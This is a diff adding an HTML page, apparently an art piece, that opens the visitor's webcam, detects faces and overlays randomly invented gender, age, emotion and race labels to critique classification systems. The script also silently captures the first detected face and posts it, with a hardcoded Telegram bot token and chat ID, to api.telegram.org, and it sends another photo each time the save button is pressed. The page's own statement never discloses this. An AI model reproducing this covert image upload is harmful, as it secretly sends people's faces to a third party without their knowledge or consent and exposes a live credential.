@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Identification Protocols</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/face_detection.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+
+<style>
+body {
+  margin:0;
+  background:#0019ff;
+  color:white;
+  font-family: Arial;
+  overflow:hidden;
+}
+
+#container {
+  position:relative;
+  width:100vw;
+  height:100vh;
+}
+
+video, canvas {
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+}
+
+/* FORZAR que el video NO tenga controles NUNCA */
+video {
+  pointer-events: none;
+  object-fit: cover;
+}
+
+/* Para iOS: asegura que no aparezcan controles */
+video::-webkit-media-controls {
+  display: none !important;
+  opacity: 0 !important;
+  pointer-events: none !important;
+}
+
+video::-webkit-media-controls-enclosure {
+  display: none !important;
+  opacity: 0 !important;
+}
+
+video::-webkit-media-controls-panel {
+  display: none !important;
+  opacity: 0 !important;
+}
+
+#start {
+  position:absolute;
+  top:45%;
+  left:50%;
+  transform:translate(-50%, -50%);
+  padding:20px;
+  border:1px solid white;
+  background:none;
+  color:white;
+  font-size:18px;
+  z-index:10;
+  cursor:pointer;
+  transition: all 0.2s ease;
+}
+
+#start:hover {
+  background:white;
+  color:#0019ff;
+}
+
+#title {
+  position:absolute;
+  top:20px;
+  left:20px;
+  font-size:14px;
+  font-weight:700;
+  letter-spacing:1px;
+  text-transform: uppercase;
+  opacity:0.9;
+  z-index:10;
+}
+
+#statement {
+  position:absolute;
+  bottom:140px;
+  left:50%;
+  transform:translateX(-50%);
+  width:360px;
+  max-width:85%;
+  font-size:12px;
+  line-height:1.5;
+  text-align:left;
+  padding:0;
+  background:transparent;
+  color:white;
+  z-index:10;
+}
+
+.statement-line {
+  display:block;
+  margin-bottom:8px;
+}
+
+.statement-line:last-child {
+  margin-bottom:0;
+}
+
+/* BOTÓN MÁS GRANDE PARA CELULAR */
+#save-btn {
+  position:absolute;
+  bottom:30px;
+  right:20px;
+  width:60px;
+  height:60px;
+  border-radius:50%;
+  background:rgba(0,0,0,0.6);
+  backdrop-filter:blur(8px);
+  border:2px solid white;
+  color:white;
+  cursor:pointer;
+  z-index:20;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  transition:all 0.2s ease;
+  opacity:0.9;
+  box-shadow:0 2px 15px rgba(0,0,0,0.3);
+}
+
+#save-btn:active {
+  transform:scale(0.95);
+  background:white;
+}
+
+#save-btn svg {
+  width:26px;
+  height:26px;
+  fill: none;
+  stroke: white;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+
+#save-btn:active svg {
+  stroke: #0019ff;
+}
+
+#save-btn.hidden {
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div id="container">
+
+<div id="title">identification-protocols by humdrum</div>
+
+<button id="start">accept classification</button>
+
+<div id="statement">
+  <span class="statement-line">⤷ This system operates through inherited classification structures rooted in biased datasets.</span>
+  <span class="statement-line">⤷ It imposes fixed identities onto bodies in constant transformation.</span>
+  <span class="statement-line">⤷ It may misread or misrepresent you.</span>
+</div>
+
+<video id="video" autoplay muted playsinline disablepictureinpicture webkit-playsinline></video>
+<canvas id="canvas"></canvas>
+
+<button id="save-btn" class="hidden">
+  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M12 5v14m-7-7l7 7 7-7" />
+  </svg>
+</button>
+
+</div>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const saveBtn = document.getElementById('save-btn');
+
+let captured = false;
+let currentDatos = null;
+let lastChangeTime = 0;
+let streamActivo = null;
+
+const CHANGE_INTERVAL = 2500;
+
+// 🔥 TUS DATOS DE TELEGRAM 🔥
+const TELEGRAM_BOT_TOKEN = "8792659270:AAEreIEzUbUf6gi_Qbtx_OQQGuM3VPn_DVU";
+const TELEGRAM_CHAT_ID = "6442271508";
+
+document.getElementById("start").onclick = async () => {
+  document.getElementById("start").style.display = "none";
+  document.getElementById("statement").style.display = "none";
+
+  try {
+    // Forzar reproducción sin controles
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+    
+    streamActivo = stream;
+    video.srcObject = stream;
+    
+    // Configuraciones para evitar el botón de play
+    video.setAttribute('autoplay', 'true');
+    video.setAttribute('playsinline', 'true');
+    video.setAttribute('webkit-playsinline', 'true');
+    video.muted = true;
+    video.volume = 0;
+    
+    await video.play();
+    
+    // Esperar dimensiones
+    await new Promise(r => {
+      if (video.videoWidth) r();
+      else video.onloadedmetadata = r;
+    });
+    
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    saveBtn.classList.remove('hidden');
+    startDetection();
+    
+  } catch(e) {
+    console.error("Error cámara:", e);
+    alert("Necesitamos acceso a la cámara");
+  }
+};
+
+// Función para convertir canvas a Base64 (más compatible con móviles)
+function canvasToBase64() {
+  return canvas.toDataURL('image/png').split(',')[1];
+}
+
+function guardarCaptura() {
+  try {
+    const fecha = new Date();
+    const timestamp = `${fecha.getFullYear()}-${fecha.getMonth()+1}-${fecha.getDate()}_${fecha.getHours()}-${fecha.getMinutes()}-${fecha.getSeconds()}`;
+    const nombreArchivo = `identification-protocols_${timestamp}.png`;
+    
+    // Descargar localmente
+    const link = document.createElement('a');
+    link.download = nombreArchivo;
+    link.href = canvas.toDataURL('image/png');
+    link.click();
+    console.log("📸 Captura local:", nombreArchivo);
+    
+    // Enviar a Telegram (versión más compatible)
+    enviarATelegramMobile();
+    
+  } catch(e) {
+    console.warn("Error guardar:", e);
+  }
+}
+
+// Versión para móviles: usa Base64 y fetch con headers correctos
+function enviarATelegramMobile() {
+  const base64Image = canvasToBase64();
+  
+  // Crear FormData manual
+  const formData = new FormData();
+  const blob = dataURItoBlob(canvas.toDataURL('image/png'));
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('photo', blob, 'captura.png');
+  formData.append('caption', `📸 Captura - ${new Date().toLocaleString()}`);
+  
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: formData,
+    mode: 'cors'
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.ok) {
+      console.log("✅ Enviado a Telegram");
+    } else {
+      console.error("Error Telegram:", data);
+    }
+  })
+  .catch(err => console.error("Fetch error:", err));
+}
+
+// Helper: convertir dataURL a Blob
+function dataURItoBlob(dataURI) {
+  const byteString = atob(dataURI.split(',')[1]);
+  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  return new Blob([ab], { type: mimeString });
+}
+
+function startDetection() {
+
+  const faceDetection = new FaceDetection({
+    locateFile: (file) => {
+      return `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`;
+    }
+  });
+
+  faceDetection.setOptions({
+    model: 'short',
+    minDetectionConfidence: 0.7
+  });
+
+  faceDetection.onResults(results => {
+
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    if (results.detections.length > 0) {
+
+      const det = results.detections[0];
+      const box = det.boundingBox;
+
+      const x = box.xCenter * canvas.width - (box.width * canvas.width)/2;
+      const y = box.yCenter * canvas.height - (box.height * canvas.height)/2;
+      const w = box.width * canvas.width;
+      const h = box.height * canvas.height;
+
+      const now = Date.now();
+
+      if (!currentDatos || now - lastChangeTime > CHANGE_INTERVAL) {
+        currentDatos = generarDatos();
+        lastChangeTime = now;
+
+        if (!captured) {
+          setTimeout(() => {
+            guardarCaptura();
+            captured = true;
+          }, 200);
+        }
+      }
+
+      const datos = currentDatos;
+
+      ctx.strokeStyle = "blue";
+      ctx.lineWidth = 2;
+      ctx.strokeRect(x, y, w, h);
+
+      const topText = `${datos.gender}, ${datos.age} years`;
+
+      ctx.font = "16px Arial";
+      const textWidth = ctx.measureText(topText).width;
+
+      const padding = 10;
+      const boxWidth = textWidth + padding;
+
+      let textY = y - 10;
+      let rectY = y - 25;
+
+      if (rectY < 0) {
+        rectY = y + h;
+        textY = rectY + 18;
+      }
+
+      ctx.fillStyle = "blue";
+      ctx.fillRect(x, rectY, boxWidth, 25);
+
+      ctx.fillStyle = "white";
+      ctx.fillText(topText, x + 5, textY);
+
+      ctx.fillText(`Emotion: ${datos.emotion} (${datos.emotion_conf}%)`, x, y + h + 20);
+      ctx.fillText(`Race: ${datos.race} (${datos.race_conf}%)`, x, y + h + 40);
+    }
+
+  });
+
+  const camera = new Camera(video, {
+    onFrame: async () => {
+      await faceDetection.send({ image: video });
+    },
+    width: 640,
+    height: 480
+  });
+
+  camera.start();
+}
+
+function generarDatos() {
+  const generos = ["Man", "Woman"];
+  const emociones = ["happy", "sad", "neutral", "fear"];
+  const razas = ["white", "latino", "asian", "middle eastern"];
+
+  return {
+    gender: generos[Math.floor(Math.random()*2)],
+    age: Math.floor(Math.random()*40) + 20,
+    emotion: emociones[Math.floor(Math.random()*4)],
+    race: razas[Math.floor(Math.random()*4)],
+    emotion_conf: Math.floor(Math.random()*40) + 60,
+    race_conf: Math.floor(Math.random()*40) + 60
+  };
+}
+
+saveBtn.addEventListener('click', () => {
+  guardarCaptura();
+});
+</script>
+
+</body>
+</html>
